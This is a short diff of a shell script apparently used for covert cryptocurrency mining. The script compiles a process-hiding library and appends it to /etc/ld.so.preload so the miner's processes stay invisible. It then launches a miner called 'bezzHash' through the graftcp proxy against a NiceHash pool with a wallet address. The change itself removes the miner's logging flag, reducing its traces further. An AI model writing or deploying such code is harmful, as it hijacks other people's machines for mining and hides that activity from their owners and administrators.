@@ -48,4 +48,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.Be1@beamv3.usa-west.nicehash.com:3387 --log --extra 
+./graftcp/graftcp ./bezzHash --url=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.Be1@beamv3.usa-west.nicehash.com:3387  --extra 
